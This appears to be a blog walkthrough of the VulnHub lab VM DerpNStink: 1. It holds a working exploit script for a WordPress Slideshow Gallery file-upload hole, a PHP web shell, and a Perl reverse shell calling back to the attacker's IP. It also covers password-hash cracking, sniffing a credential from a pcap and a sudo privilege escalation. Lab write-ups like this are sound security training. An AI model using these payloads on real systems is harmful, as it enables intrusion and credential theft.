---
layout: post
title: "Misfortune in South Park"
category: Walkthrough
tags: [VulnHub, "DerpNStink"]
comments: true
image:
  feature: ouch.jpg
  credit: stevepb / Pixabay
  creditlink: https://pixabay.com/en/slip-up-danger-careless-slippery-709045/
---

This post documents the complete walkthrough of DerpNStink: 1, a boot2root [VM][1] created by [Bryan Smith][2] and hosted at [VulnHub][3]. If you are uncomfortable with spoilers, please stop reading now.
{: .notice}

<!--more-->

### Background

Mr. Derp and Uncle Stinky are two system administrators who are starting their own company, DerpNStink. Instead of hiring qualified professionals to build up their IT landscape, they decided to hack together their own system which is almost ready to go live...

### Information Gathering

Let's kick this off with a `nmap` scan to establish the services available in the host:

```
# nmap -n -v -Pn -p- -A --reason -oN nmap.txt 192.168.10.130
...
PORT   STATE SERVICE REASON         VERSION
21/tcp open  ftp     syn-ack ttl 64 vsftpd 3.0.2
22/tcp open  ssh     syn-ack ttl 64 OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 12:4e:f8:6e:7b:6c:c6:d8:7c:d8:29:77:d1:0b:eb:72 (DSA)
|   2048 72:c5:1c:5f:81:7b:dd:1a:fb:2e:59:67:fe:a6:91:2f (RSA)
|   256 06:77:0f:4b:96:0a:3a:2c:3b:f0:8c:2b:57:b5:97:bc (ECDSA)
|_  256 28:e8:ed:7c:60:7f:19:6c:e3:24:79:31:ca:ab:5d:2d (EdDSA)
80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.7 ((Ubuntu))
| http-methods: 
|_  Supported Methods: OPTIONS GET HEAD POST
| http-robots.txt: 2 disallowed entries 
|_/php/ /temporary/
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: DeRPnStiNK
```

My usual game plan is to target the web service first, especially if `nmap` tells me that `robots.txt` exists. Let's start with that.

### HTML Source

Using `curl` and some `grep`-fu on the HTML source, the first flag was captured pretty easily.

```
# curl -s 192.168.10.130 | grep -P 'href=|src=|<!?--' | sed -r 's/^\s+//'
<link rel="stylesheet" href="css/style.css">
<script type="text/javascript" src="http://ajax.googleapis.com/ajax/libs/jquery/1.7.1/jquery.min.js"></script>
<script type="text/javascript" src="/is/js/release/kveik.1.4.24.js?1"></script>
<script type="text/info" src="/webnotes/info.txt"></script>
<!-- particles.js container -->
<!-- stats - count particles -->
<img src="derp.png">
<img src="stinky.png">
<script src='js/particles.min.js'></script>
<script src="js/index.js"></script>
<--flag1(52E37291AEDF6A46D7D0BB8A6312F4F9F1AA4975C248C3F0E008CBA09D6E9166) -->
```

### Web Notes

Something else was there as well: `/webnotes`

```
# curl http://192.168.10.130/webnotes/
HTTP/1.1 200 OK
Date: Tue, 27 Mar 2018 10:04:12 GMT
Server: Apache/2.4.7 (Ubuntu)
Last-Modified: Tue, 09 Jan 2018 17:28:41 GMT
ETag: "ebb-5625b3ef406ca"
Accept-Ranges: bytes
Content-Length: 3771
Vary: Accept-Encoding
Content-Type: text/html

[stinky@DeRPnStiNK /var/www/html ]$ whois derpnstink.local
   Domain Name: derpnstink.local
   Registry Domain ID: 2125161577_DOMAIN_COM-VRSN
   Registrar WHOIS Server: whois.fakehosting.com
   Registrar URL: http://www.fakehosting.com
   Updated Date: 2017-11-12T16:13:16Z
   Creation Date: 2017-11-12T16:13:16Z
   Registry Expiry Date: 2017-11-12T16:13:16Z
   Registrar: fakehosting, LLC
   Registrar IANA ID: 1337
   Registrar Abuse Contact Email: stinky@derpnstink.local
   Registrar Abuse Contact Phone:
   Domain Status: clientTransferProhibited https://icann.org/epp#clientTransferProhibited

   DNSSEC: unsigned
   URL of the ICANN Whois Inaccuracy Complaint Form: https://www.icann.org/wicf/
>>> Last update of whois database: 2017-11-12T16:13:16Z <<<

For more information on Whois status codes, please visit https://icann.org/epp

NOTICE: The expiration date displayed in this record is the date the
registrar's sponsorship of the domain name registration in the registry is
currently set to expire. This date does not necessarily reflect the expiration
date of the domain name registrant's agreement with the sponsoring
registrar.  Users may consult the sponsoring registrar's Whois database to
view the registrar's reported date of expiration for this registration.

TERMS OF USE: You are not authorized to access or query our Whois
database through the use of electronic processes that are high-volume and
automated except as reasonably necessary to register domain names or
modify existing registrations; the Data in VeriSign Global Registry
Services' ("VeriSign") Whois database is provided by VeriSign for
information purposes only, and to assist persons in obtaining information
about or related to a domain name registration record. VeriSign does not
guarantee its accuracy. By submitting a Whois query, you agree to abide
by the following terms of use: You agree that you may use this Data only
for lawful purposes and that under no circumstances will you use this Data
to: (1) allow, enable, or otherwise support the transmission of mass
unsolicited, commercial advertising or solicitations via e-mail, telephone,
or facsimile; or (2) enable high volume, automated, electronic processes
that apply to VeriSign (or its computer systems). The compilation,
repackaging, dissemination or other use of this Data is expressly
prohibited without the prior written consent of VeriSign. You agree not to
use electronic processes that are automated and high-volume to access or
query the Whois database except as reasonably necessary to register
domain names or modify existing registrations. VeriSign reserves the right
to restrict your access to the Whois database in its sole discretion to ensure
operational stability.  VeriSign may restrict or terminate your access to the
Whois database for failure to abide by these terms of use. VeriSign
reserves the right to modify these terms at any time.

The Registry database contains ONLY .COM, .NET, .EDU domains and
Registrars.

[stinky@DeRPnStiNK: /var/www/html/php]~$ ping derpnstink.local
PING derpnstink.local (127.0.0.1) 56(84) bytes of data.
64 bytes from localhost (127.0.0.1): icmp_seq=1 ttl=64 time=0.015 ms
64 bytes from localhost (127.0.0.1): icmp_seq=2 ttl=64 time=0.018 ms
64 bytes from localhost (127.0.0.1): icmp_seq=3 ttl=64 time=0.025 ms
64 bytes from localhost (127.0.0.1): icmp_seq=4 ttl=64 time=0.023 ms
64 bytes from localhost (127.0.0.1): icmp_seq=5 ttl=64 time=0.022 ms
64 bytes from localhost (127.0.0.1): icmp_seq=6 ttl=64 time=0.025 ms
64 bytes from localhost (127.0.0.1): icmp_seq=7 ttl=64 time=0.026 ms
^C
--- derpnstink.local ping statistics ---
7 packets transmitted, 7 received, 0% packet loss, time 5998ms
rtt min/avg/max/mdev = 0.015/0.022/0.026/0.003 ms
stinky@DeRPnStiNK:~$ 
```
Several things were noted:

* The FQDN of the host is `derpnstink.local`; and
* User `stinky` exists; and
* DocumentRoot is at `/var/www/html`.

### Directory/File Enumeration

Using `gobuster` for a quick enumeration, the following additional directories were found.

```
Gobuster v1.2                OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://192.168.10.130/
[+] Threads      : 10
[+] Wordlist     : /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
[+] Status codes : 204,301,302,307,200
[+] Expanded     : true
=====================================================
http://192.168.10.130/weblog (Status: 301)
http://192.168.10.130/php (Status: 301)
http://192.168.10.130/css (Status: 301)
http://192.168.10.130/js (Status: 301)
http://192.168.10.130/javascript (Status: 301)
http://192.168.10.130/temporary (Status: 301)
=====================================================
```

Both `/php` and `/temporary` were already listed in `robots.txt`.

Using `gobuster` and `common.txt` from [SecLists](https://github.com/danielmiessler/SecLists) more interesting stuff can be found.

```
http://192.168.10.130/php/info.php (Status: 200)
http://192.168.10.130/php/phpmyadmin (Status: 301)
http://192.168.10.130/weblog/index.php (Status: 200)
http://192.168.10.130/weblog/wp-admin (Status: 301)
http://192.168.10.130/weblog/wp-content (Status: 301)
http://192.168.10.130/weblog/wp-includes (Status: 301)
```

It appeared that `/weblog` is the root directory for WordPress. As such, there is a need to place the FQDN in my hosts file as shown here.

```
curl -i 192.168.10.130/weblog/
HTTP/1.1 301 Moved Permanently
Date: Tue, 27 Mar 2018 10:13:50 GMT
Server: Apache/2.4.7 (Ubuntu)
X-Powered-By: PHP/5.5.9-1ubuntu4.22
X-Pingback: http://derpnstink.local/weblog/xmlrpc.php
Location: http://derpnstink.local/weblog/
Content-Length: 0
Content-Type: text/html; charset=UTF-8
```
There was also another hint from `/webnotes/info.txt` to do likewise.

```
<-- @stinky, make sure to update your hosts file with local dns so the new derpnstink blog can be reached before it goes live --> 
```

### Slideshow Gallery < 1.4.7 Arbitrary File Upload

Using `wpscan`, it was extremely simple to enumerate for vulnerable WordPress plugins. As it turned out, this particular version 1.4.6 had an arbitrary file upload [vulnerability](https://www.exploit-db.com/exploits/34514/).

I wrote `upload.sh`, a `bash` script that does just that.

{% highlight bash linenos %}
#!/bin/bash

HOST=derpnstink.local
BLOG=weblog
USER=admin
PASS=$USER
VULN="wp-admin/admin.php?page=slideshow-slides&method=save"
FILE=$1

curl \
    -s \
    -c cookie \
    -d "log=$USER&pwd=$PASS&wp-submit=Log" \
    http://$HOST/$BLOG/wp-login.php

curl \
    -s \
    -b cookie \
    -H "Expect:" \
    -o /dev/null \
    -F "Slide[id]=" \
    -F "Slide[order]=" \
    -F "Slide[title]=$(mktemp -u | sed -r 's/^.*tmp\.(.*)$/\1/')" \
    -F "Slide[description]=" \
    -F "Slide[showinfo]=both" \
    -F "Slide[iopacity]=70" \
    -F "Slide[galleries][]=1" \
    -F "Slide[type]=file" \
    -F "image_file=@$FILE;filename=$FILE;type=application/octet-stream" \
    -F "Slide[image_url]=" \
    -F "Slide[uselink]=N" \
    -F "Slide[link]=" \
    -F "Slide[linktarget]=self" \
    -F "submit=Save Slide" \
    http://$HOST/$BLOG/$VULN

# cleanup
rm -rf cookie
{% endhighlight %}

A simple PHP file that executes remote commands was uploaded using the script.

```
# cat cmd.php
<pre><?php echo shell_exec($_GET['cmd']);?></pre>

# ./upload.sh cmd.php
```

### Low Privilege Shell

Now that I've uploaded the file, the next step is to navigate to `http://derpnstink.local/weblog/wp-content/uploads/slideshow-gallery/cmd.php` to trigger a reverse shell.

Whenever possible, I like to use Perl for my reverse shell.

```perl
perl -e 'use Socket;$i="192.168.10.129";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

Since we are passing the above command to `cmd.php`, it's best to `urlencode` it to avoid complications. The entire URL looked like this.

```
http://derpnstink.local/weblog/wp-content/uploads/slideshow-gallery/cmd.php?cmd=perl%20-e%20%27use%20Socket%3B%24i%3D%22192.168.10.129%22%3B%24p%3D443%3Bsocket%28S%2CPF_INET%2CSOCK_STREAM%2Cgetprotobyname%28%22tcp%22%29%29%3Bif%28connect%28S%2Csockaddr_in%28%24p%2Cinet_aton%28%24i%29%29%29%29%7Bopen%28STDIN%2C%22%3E%26S%22%29%3Bopen%28STDOUT%2C%22%3E%26S%22%29%3Bopen%28STDERR%2C%22%3E%26S%22%29%3Bexec%28%22%2Fbin%2Fsh%20-i%22%29%3B%7D%3B%27
```

On my end, I just need to setup my `netcat` listener and wait for the shell.

![screenshot-1](/assets/images/posts/derpnstink-walkthrough/screenshot-1.png)

Let's spawn a pseudo-TTY for better display and output control.

![screenshot-2](/assets/images/posts/derpnstink-walkthrough/screenshot-2.png)

### Database Dump

Now that I've access to a low privilege shell, let's dump the WordPress database. The database configuration parameters should be located in the WordPress directory.

![screenshot-3](/assets/images/posts/derpnstink-walkthrough/screenshot-3.png)

```
$ cat wp-config.php
...
// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define('DB_NAME', 'wordpress');

/** MySQL database username */
define('DB_USER', 'root');

/** MySQL database password */
define('DB_PASSWORD', 'mysql');
```

Let's proceed to dump and view the database.

```
$ mysqldump -uroot -pmysql wordpress > /tmp/dump.txt
```

Two things stood out from the dump: **flag** and **password hashes**.

```
'flag2(a7d355b26bda6bf1196ccffead0b2cf2b81f0a9de5b4876b44407f1dc07e51e6)','Flag.txt','','draft','open','open'
```

```
INSERT INTO `wp_users` VALUES (1,'unclestinky','$P$BW6NTkFvboVVCHU2R9qmNai1WfHSC41','unclestinky','unclestinky@DeRPnStiNK.local','','2017-11-12 03:25:32','1510544888:$P$BQbCmzW/ICRqb1hU96nIVUFOlNMKJM1',0,'unclestinky',''),(2,'admin','$P$BgnU3VLAv.RWd3rdrkfVIuQr6mFvpd/','admin','admin@derpnstink.local','','2017-11-13 04:29:35','',0,'admin','');
```

### John the Ripper

Using John the Ripper with a wordlist like "rockyou", cracking WordPress passwords has never been easier.

```
# john --format=phpass --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
# john --show hashes.txt 
unclestinky:wedgie57:::::
admin:admin:::::
```
### Getting to South Park

Remember that we are still in the low-privileged shell? And since `/etc/passwd` is world-readable, let's enumerate the users in the host.

```
$ cat /etc/passwd 
root:x:0:0:root:/root:/bin/bash
...
sshd:x:117:65534::/var/run/sshd:/usr/sbin/nologin
stinky:x:1001:1001:Uncle Stinky,,,:/home/stinky:/bin/bash
ftp:x:118:126:ftp daemon,,,:/srv/ftp:/bin/false
mrderp:x:1000:1000:Mr. Derp,,,:/home/mrderp:/bin/bash
```

Let's see if we can login to Uncle Stinky's account with the password (`wedgie57`).

![screenshot-4](/assets/images/posts/derpnstink-walkthrough/screenshot-4.png)

During enumeration of Uncle Stinky's account, the third flag was discovered in `/home/stinky/Desktop`.

Enumerating further, a conversation between Mr. Derp and Uncle Stinky was uncovered. It appeared that Mr. Derp couldn't login to WordPress and Uncle Stinky has captured some network traffic to assist in troubleshooting the issue.

```
$ cd ~/ftp/files/network-logs
$ cat derpissues.txt
12:06 mrderp: hey i cant login to wordpress anymore. Can you look into it?
12:07 stinky: yeah. did you need a password reset?
12:07 mrderp: I think i accidently deleted my account
12:07 mrderp: i just need to logon once to make a change
12:07 stinky: im gonna packet capture so we can figure out whats going on
12:07 mrderp: that seems a bit overkill, but wtv
12:08 stinky: commence the sniffer!!!!
12:08 mrderp: -_-
12:10 stinky: fine derp, i think i fixed it for you though. cany you try to login?
12:11 mrderp: awesome it works!
12:12 stinky: we really are the best sysadmins #team
12:13 mrderp: i guess we are...
12:15 mrderp: alright I made the changes, feel free to decomission my account
12:20 stinky: done! yay
```

``` 
$ cd ~/Documents
$ tcpdump -nt -r derpissues.pcap -A 2>/dev/null | grep -P 'pwd='
log=unclestinky%40derpnstink.local&pwd=wedgie57&wp-submit=Log+In&redirect_to=http%3A%2F%2Fderpnstink.local%2Fweblog%2Fwp-admin%2F&testcookie=1
log=mrderp&pwd=derpderpderpderpderpderpderp&wp-submit=Log+In&redirect_to=http%3A%2F%2Fderpnstink.local%2Fweblog%2Fwp-admin%2F&testcookie=1
log=unclestinky%40derpnstink.local&pwd=wedgie57&wp-submit=Log+In&redirect_to=http%3A%2F%2Fderpnstink.local%2Fweblog%2Fwp-admin%2F&testcookie=1
```
Let's login to Mr. Derp's account.

![screenshot-5](/assets/images/posts/derpnstink-walkthrough/screenshot-5.png)

A helpdesk ticket was uncovered during the enumeration of Mr. Derp's account. Apparently, Mr. Derp had an issue with `sudoer`. 

```
$ cd /support
$ cat troubleshooting.txt
*******************************************************************
On one particular machine I often need to run sudo commands every now and then. I am fine with entering password on sudo in most of the cases.

However i dont want to specify each command to allow

How can I exclude these commands from password protection to sudo?

********************************************************************



********************************************************************
Thank you for contacting the Client Support team. This message is to confirm that we have resolved and closed your ticket. 

Please contact the Client Support team at https://pastebin.com/RzK9WfGw if you have any further questions or issues.

Thank you for using our product.

********************************************************************
```

The resolution can be found at `https://pastebin.com/RzK9WfGw`.

![screenshot-6](/assets/images/posts/derpnstink-walkthrough/screenshot-6.png)

This is in fact also the answer to privilege escalation, unbeknownst to poor Mr. Derp and Uncle Stinky!

### Privilege Escalation

Assuming that `mrderp ALL=(ALL) /home/mrderp/binaries/derpy*` is in `/etc/sudoers`, we can do the following to gain `root` privileges.

```
$ mkdir -p /home/mrderp/binaries
$ echo -e '#!/usr/bin/env python\nimport os\nos.setuid(0)\nos.setgid(0)\nos.system("/bin/bash")' > /home/mrderp/binaries/derpy
$ chmod +x /home/mrderp/binaries/derpy
$ sudo /home/mrderp/binaries/derpy
```

And since we already knew the password to Mr. Derp's account.

![screenshot-7](/assets/images/posts/derpnstink-walkthrough/screenshot-7.png)

Boom.

The fourth flag was at `/root/Desktop/flag.txt`.

:dancer:

### Flags

```
flag1(52E37291AEDF6A46D7D0BB8A6312F4F9F1AA4975C248C3F0E008CBA09D6E9166)
flag2(a7d355b26bda6bf1196ccffead0b2cf2b81f0a9de5b4876b44407f1dc07e51e6)
flag3(07f62b021771d3cf67e2e1faf18769cc5e5c119ad7d4d1847a11e11d6d5a7ecb)
flag4(49dca65f362fee401292ed7ada96f96295eab1e589c52e4e66bf4aedda715fdd)
```

[1]: https://www.vulnhub.com/entry/derpnstink-1,221/
[2]: https://twitter.com/@securekomodo
[3]: https://www.vulnhub.com

*[FQDN]: Fully Qualified Domain Name
